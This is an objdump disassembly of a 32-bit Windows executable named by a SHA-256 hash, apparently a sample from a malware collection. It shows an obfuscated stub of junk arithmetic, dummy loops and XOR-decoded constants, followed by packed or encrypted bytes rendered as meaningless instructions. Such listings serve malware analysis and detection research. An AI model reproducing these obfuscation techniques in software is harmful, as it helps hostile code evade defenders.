
4dca9caf419eef9ebd19ccfe66ca4c868fd8d1773da0d2aae954cb69efeb595e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xbfa5c454
  40157e:	xchg   esp,eax
  40157f:	iret   
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [edi-0x75],edx
  401596:	mov    cl,BYTE PTR [ebx+0x1d22b38a]
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x1f5c06c4],0x9
  40162d:	adc    edi,DWORD PTR [edx]
  40162f:	fild   DWORD PTR [edx+0x4934b213]
  401635:	test   ah,bl
  401637:	aam    0x8b
  401639:	jbe    0x40164b
  40163b:	test   DWORD PTR [edi-0x3c],esp
  40163e:	add    eax,0xa472d96f
  401643:	test   BYTE PTR [esi],dh
  401645:	xlat   BYTE PTR ds:[ebx]
  401646:	cmp    DWORD PTR [ecx],ebx
  401648:	push   es
  401649:	xchg   ecx,eax
  40164a:	js     0x4015e2
  40164c:	aam    0x1e
  40164e:	adc    esi,DWORD PTR [ebx]
  401650:	stos   DWORD PTR es:[edi],eax
  401651:	mov    ah,0x30
  401653:	fcom   DWORD PTR fs:[edi+0x581934d2]
  40165a:	fldenv [eax]
  40165c:	rol    cl,1
  40165e:	pop    ebp
  40165f:	loop   0x4016c8
  401661:	out    0x32,eax
  401663:	sahf   
  401664:	les    esi,FWORD PTR [edx-0x286b2465]
  40166a:	enter  0xc411,0x5b
  40166e:	jbe    0x40162f
  401670:	icebp  
  401671:	cli    
  401672:	popf   
  401673:	cs adc al,0x40
  401676:	iret   
  401677:	aas    
  401678:	shr    DWORD PTR [ebx-0x14fe39c2],0xda
  40167f:	or     edi,0x735b973e
  401685:	dec    ch
  401687:	ret    
  401688:	push   ecx
  401689:	retf   0x80eb
  40168c:	int3   
  40168d:	aaa    
  40168e:	or     DWORD PTR [ebx+ebx*4],0x52126c19
  401695:	pushf  
  401696:	inc    edx
  401697:	cmc    
  401698:	cmp    al,BYTE PTR [eax]
  40169a:	and    BYTE PTR [ecx-0x1c],ch
  40169d:	lods   al,BYTE PTR ds:[esi]
  40169e:	js     0x401661
  4016a0:	adc    eax,0xea1bd495
  4016a5:	retf   0xf98e
  4016a8:	mov    ch,0x16
  4016aa:	push   ss
  4016ab:	das    
  4016ac:	add    ecx,DWORD PTR [edx+edi*2+0x76]
  4016b0:	xor    DWORD PTR [edx],esi
  4016b2:	aam    0xe7
  4016b4:	fild   DWORD PTR [ebx+0x20]
  4016b7:	gs dec eax
  4016b9:	jg     0x40171c
  4016bb:	js     0x4016f8
  4016bd:	or     DWORD PTR [ecx],eax
  4016bf:	int    0x74
  4016c1:	dec    ebx
  4016c2:	fwait
  4016c3:	mov    esp,0xfaa563c2
  4016c8:	sub    ecx,DWORD PTR [ebx]
  4016ca:	jecxz  0x4016d7
  4016cc:	pop    eax
  4016cd:	and    DWORD PTR [ecx+0x1f],edi
  4016d0:	gs scas eax,DWORD PTR es:[edi]
  4016d2:	adc    BYTE PTR [ebx+0x72],0x5b
  4016d6:	imul   ecx,DWORD PTR [eax],0xffffff91
  4016d9:	pusha  
  4016da:	add    al,0x50
  4016dc:	xlat   BYTE PTR ds:[ebx]
  4016dd:	sbb    esp,eax
  4016df:	into   
  4016e0:	and    ebx,DWORD PTR [ecx-0x65640ff1]
  4016e6:	shl    DWORD PTR [esi-0x1113153],0xf4
  4016ed:	cmp    DWORD PTR [esi],0xffffff95
  4016f0:	bound  edx,QWORD PTR [edx-0x25]
  4016f3:	mov    esi,0x55dbbf43
  4016f8:	pop    es
  4016f9:	fnstcw WORD PTR [ecx-0x2f9f8cc3]
  4016ff:	popf   
  401700:	out    dx,eax
  401701:	inc    ebp
  401702:	xor    bh,ch
  401704:	in     al,0x18
  401706:	iret   
  401707:	int3   
  401708:	or     al,0xb3
  40170a:	iret   
  40170b:	cdq    
  40170c:	mov    esi,0xe3df4e7
  401711:	push   es
  401712:	cmp    eax,DWORD PTR [eax]
  401714:	add    eax,0x4f0556a1
  401719:	jbe    0x40178c
  40171b:	adc    DWORD PTR [esi],esp
  40171d:	jl     0x40176d
  40171f:	add    eax,0x7003b39c
  401724:	fiadd  WORD PTR [ebp+0x20]
  401727:	lods   al,BYTE PTR ds:[esi]
  401728:	adc    esp,DWORD PTR [esi]
  40172a:	sar    DWORD PTR [eax+0x607e15f5],1
  401730:	xchg   edx,eax
  401731:	ret    
  401732:	lds    ebp,FWORD PTR [eax]
  401734:	add    edx,DWORD PTR [esp+ecx*8-0x49]
  401738:	mov    dl,0xf
  40173a:	jge    0x4016ca
  40173c:	xlat   BYTE PTR ds:[ebx]
  40173d:	popa   
  40173e:	inc    edx
  40173f:	cmp    esi,DWORD PTR [edx-0x7bd99d23]
  401745:	adc    DWORD PTR [esi+0x36bc9349],esp
  40174b:	loop   0x401744
  40174d:	repnz add ebx,edx
  401750:	adc    ecx,DWORD PTR [esp+edi*4]
  401753:	sbb    ebp,0x7dff6f86
  401759:	or     cl,0xf2
  40175c:	shl    ebp,1
  40175e:	and    ch,al
  401760:	gs pushf 
  401762:	sbb    BYTE PTR [eax-0x50],bh
  401765:	mov    dl,0x78
  401767:	push   ss
  401768:	rol    ah,0x2
  40176b:	fcomip st,st(4)
  40176d:	mov    cl,0xe6
  40176f:	aad    0x4e
  401771:	mov    cl,0x5c
  401773:	xchg   edi,eax
  401774:	and    bh,dl
  401776:	mov    bl,0xcd
  401778:	or     BYTE PTR [esi],al
  40177a:	rcl    BYTE PTR [edi],1
  40177c:	dec    ebp
  40177d:	sub    dl,BYTE PTR [eax-0xb3eefa3]
  401783:	dec    esp
  401784:	or     BYTE PTR [edi],0xb6
  401787:	fistp  WORD PTR [ecx+0x1e81bc0b]
  40178d:	and    cl,bh
  40178f:	jno    0x401809
  401791:	jne    0x4017b1
  401793:	inc    esp
  401794:	sub    BYTE PTR [ecx-0x60],ch
  401797:	xchg   DWORD PTR [ebx+0x7f13bed1],edi
  40179d:	jp     0x401744
  40179f:	test   al,0xd4
  4017a1:	dec    ebx
  4017a2:	and    eax,0x28254ac7
  4017a7:	or     esp,edi
  4017a9:	icebp  
  4017aa:	xchg   edx,eax
  4017ab:	in     al,dx
  4017ac:	stc    
  4017ad:	xor    eax,0xde3ecc7f
  4017b2:	xor    bh,BYTE PTR [esp+eax*8-0x3f]
  4017b6:	aas    
  4017b7:	dec    esi
  4017b8:	sub    al,0x8d
  4017ba:	or     ch,bl
  4017bc:	add    ch,BYTE PTR [edx]
  4017be:	push   eax
  4017bf:	cwde   
  4017c0:	xor    BYTE PTR [eax+0x30b0a7e0],al
  4017c6:	inc    ebp
  4017c7:	dec    edi
  4017c8:	rcl    ah,1
  4017ca:	mov    DWORD PTR ds:0x443e62d7,edi
  4017d0:	push   0x78
  4017d2:	mov    ds:0x9160712c,eax
  4017d7:	cmp    BYTE PTR [eax+ebp*1+0x54ceaa35],ah
  4017de:	mov    ?,WORD PTR [ebp-0x5423c034]
  4017e4:	inc    ecx
  4017e5:	push   edi
  4017e6:	lods   eax,DWORD PTR ds:[esi]
  4017e7:	(bad)  
  4017e9:	repz in eax,dx
  4017eb:	xor    eax,0xe0f5d38e
  4017f0:	sub    ecx,DWORD PTR [ebp-0x756eb299]
  4017f6:	pop    edi
  4017f7:	and    dh,BYTE PTR [eax+0x7e]
  4017fa:	lds    esp,FWORD PTR [eax-0x28a14c52]
  401800:	ja     0x401869
  401802:	icebp  
  401803:	push   eax
  401804:	fwait
  401805:	call   0xd39a:0xc34041ad
  40180c:	cmp    eax,0x83624cab
  401811:	test   DWORD PTR [edi],esp
  401813:	popf   
  401814:	gs retf 
  401816:	cmp    dl,dh
  401818:	mov    ah,BYTE PTR [esi]
  40181a:	ja     0x4017e0
  40181c:	(bad)  [ecx]
  40181e:	cli    
  40181f:	out    dx,eax
  401820:	mov    ch,0xf8
  401822:	dec    ebp
  401823:	and    BYTE PTR [ebx],ah
  401825:	ja     0x401829
  401827:	rcl    DWORD PTR [edi+ebx*4+0x129d8c08],0x54
  40182f:	sub    eax,0x294c2dba
  401834:	dec    edx
  401835:	pop    ds
  401836:	sar    DWORD PTR [eax+ecx*4],0x8b
  40183a:	pop    ds
  40183b:	mov    dl,0x42
  40183d:	call   0x1448:0xf5878b32
  401844:	dec    ebx
  401845:	in     eax,0x83
  401847:	jne    0x4017fc
  401849:	pop    ebx
  40184a:	xchg   esp,eax
  40184b:	add    al,0x75
  40184d:	(bad)  
  40184e:	sub    al,0xc7
  401850:	into   
  401851:	in     al,dx
  401852:	mov    edi,0xbd05df08
  401857:	out    dx,al
  401858:	mov    esp,0x2c8d55ce
  40185d:	and    eax,0x7f9eaafd
  401862:	jbe    0x4017e9
  401864:	test   esp,edi
  401866:	into   
  401867:	out    dx,eax
  401868:	cmp    DWORD PTR [ebx+0x236f8dc6],ecx
  40186e:	push   ecx
  40186f:	js     0x4017f6
  401871:	sub    esp,0x6b59358f
  401877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401878:	std    
  401879:	xor    eax,0x9f2580f1
  40187e:	xor    DWORD PTR [ebp+0x3d],esi
  401881:	or     al,0xc5
  401883:	sti    
  401884:	jmp    0xff9f259e
  401889:	inc    esi
  40188a:	out    0xf3,eax
  40188c:	cmp    eax,0x76d2c720
  401891:	ja     0xd6c9736c
  401897:	jle    0x401820
  401899:	mov    ebx,0x1ce75aa2
  40189e:	cmp    BYTE PTR [esp+edi*2-0x54],ah
  4018a2:	rcr    DWORD PTR [eax-0x215b59bf],1
  4018a8:	and    ebx,DWORD PTR [ebx]
  4018aa:	jmp    0x964b:0xb812a1de
  4018b1:	sub    eax,0xfcd83a4c
  4018b6:	out    0x69,eax
  4018b8:	xchg   ebx,eax
  4018b9:	cmp    BYTE PTR [esi+0x2f],0xa
  4018bd:	aam    0x55
  4018bf:	pop    esp
  4018c0:	shl    bl,1
  4018c2:	xchg   edx,eax
  4018c3:	mov    edi,0x1c3e59cf
  4018c8:	retf   0xf455
  4018cb:	jo     0x401903
  4018cd:	lock int 0x7
  4018d0:	jae    0x401881
  4018d2:	mov    edi,edx
  4018d4:	scas   eax,DWORD PTR es:[edi]
  4018d5:	sbb    DWORD PTR [ebp+0x71],ecx
  4018d8:	shl    BYTE PTR [eax-0x6c],1
  4018db:	xchg   esp,eax
  4018dc:	jne    0x401860
  4018de:	mov    ah,0x46
  4018e0:	mov    DWORD PTR [edi-0x1c],esp
  4018e3:	mov    esp,0x245e2b51
  4018e8:	dec    edi
  4018e9:	sub    eax,0x42f6171b
  4018ee:	test   dl,0xa6
  4018f1:	scas   al,BYTE PTR es:[edi]
  4018f2:	and    DWORD PTR [esi],0xee57dcd3
  4018f8:	cmp    BYTE PTR [ecx-0x737b02f],0xb
  4018ff:	xchg   ebx,eax
  401900:	sub    esp,DWORD PTR [ecx-0x4f]
  401903:	fidivr WORD PTR [edx-0x2f29b510]
  401909:	out    0x7c,eax
  40190b:	lock test BYTE PTR [eax+0x1ff837a5],bl
  401912:	popf   
  401913:	mov    ?,WORD PTR [esi-0x47f62eeb]
  401919:	push   0xffffff80
  40191b:	aas    
  40191c:	pop    esp
  40191d:	dec    ebx
  40191e:	mov    cs,WORD PTR ds:0x449861e7
  401924:	mov    ds:0xa37e73a4,eax
  401929:	lods   al,BYTE PTR ds:[esi]
  40192a:	push   ds
  40192b:	or     DWORD PTR [edi-0x53],ebp
  40192e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40192f:	pop    es
  401930:	pop    ss
  401931:	xchg   ebp,eax
  401932:	dec    ebx
  401933:	test   al,0x2c
  401935:	push   ecx
  401936:	mov    dh,0x92
  401938:	push   ebp
  401939:	leave  
  40193a:	mov    edi,0x55937ff7
  40193f:	mov    dl,0xb5
  401941:	jae    0x4018fa
  401943:	dec    ecx
  401944:	hlt    
  401945:	outs   dx,DWORD PTR ds:[esi]
  401946:	les    esp,FWORD PTR [esp+ebp*4+0x1910b6ff]
  40194d:	pop    edi
  40194e:	out    dx,al
  40194f:	dec    edi
  401950:	mov    al,ds:0xe301fb86
  401955:	fwait
  401956:	push   0x7e60c30c
  40195b:	add    ecx,DWORD PTR [edi-0x1]
  40195e:	mov    ecx,0xad0e49db
  401963:	inc    sp
  401965:	xchg   edi,eax
  401966:	xchg   BYTE PTR [ecx+0x2f785bb3],ch
  40196c:	fistp  QWORD PTR [edi-0x5c]
  40196f:	dec    edi
  401970:	sahf   
  401971:	leave  
  401972:	clc    
  401973:	test   DWORD PTR [ecx],esp
  401975:	jne    0x4019cd
  401977:	out    dx,eax
  401978:	xchg   ebp,eax
  401979:	sbb    bh,al
  40197b:	(bad)  
  40197c:	into   
  40197d:	sbb    ah,ah
  40197f:	inc    edx
  401980:	dec    ebp
  401981:	or     esp,DWORD PTR [ebx]
  401983:	fild   DWORD PTR [ecx-0x3bbdc962]
  401989:	dec    edx
  40198a:	aam    0x61
  40198c:	xor    dh,BYTE PTR [edi]
  40198e:	aaa    
  40198f:	shl    DWORD PTR [esi-0x27],cl
  401992:	xor    cl,bl
  401994:	mov    ds:0x5c7b68ad,al
  401999:	aam    0x40
  40199b:	repnz and al,0x9e
  40199e:	shl    BYTE PTR [ecx+0x52],0xdc
  4019a2:	xor    DWORD PTR [esi-0x18],esp
  4019a5:	sub    al,0x4
  4019a7:	push   DWORD PTR [edi]
  4019a9:	and    eax,0x102a4b87
  4019ae:	mov    DWORD PTR [eax+esi*4-0x6f94aa40],ebx
  4019b5:	cmp    esp,esi
  4019b7:	out    dx,al
  4019b8:	test   edi,esi
  4019ba:	mov    ch,0x62
  4019bc:	in     eax,0x40
  4019be:	jb     0x4019bd
  4019c0:	inc    edi
  4019c1:	(bad)  
  4019c2:	repnz mov eax,ds:0x76755e64
  4019c8:	jmp    0x401a44
  4019ca:	jne    0x4019b7
  4019cc:	imul   BYTE PTR [edi+0x5d]
  4019cf:	popf   
  4019d0:	sub    al,BYTE PTR [esi]
  4019d2:	pop    edx
  4019d3:	fadd   QWORD PTR [esi+0x55]
  4019d6:	(bad)  
  4019d7:	and    BYTE PTR [ebx+ecx*8+0x571a66f9],bh
  4019de:	pop    edi
  4019df:	icebp  
  4019e0:	pop    ecx
  4019e1:	mov    bl,0x26
  4019e3:	es test eax,0x42d3408a
  4019ea:	and    DWORD PTR [ecx+0x50ac0211],edx
  4019f0:	or     al,cl
  4019f2:	repz shr ebx,1
  4019f5:	sti    
  4019f6:	jmp    0xc47e:0xae9c9605
  4019fd:	test   bl,cl
  4019ff:	pop    es
  401a00:	mov    ch,0xb0
  401a02:	ret    0xd4e0
  401a05:	mov    BYTE PTR [ebp-0x2c],cl
  401a08:	jmp    DWORD PTR [ebp+0x501e3556]
  401a0e:	mov    al,ah
  401a10:	push   ebx
  401a11:	jle    0x401993
  401a13:	test   al,0x32
  401a15:	jle    0x401a5e
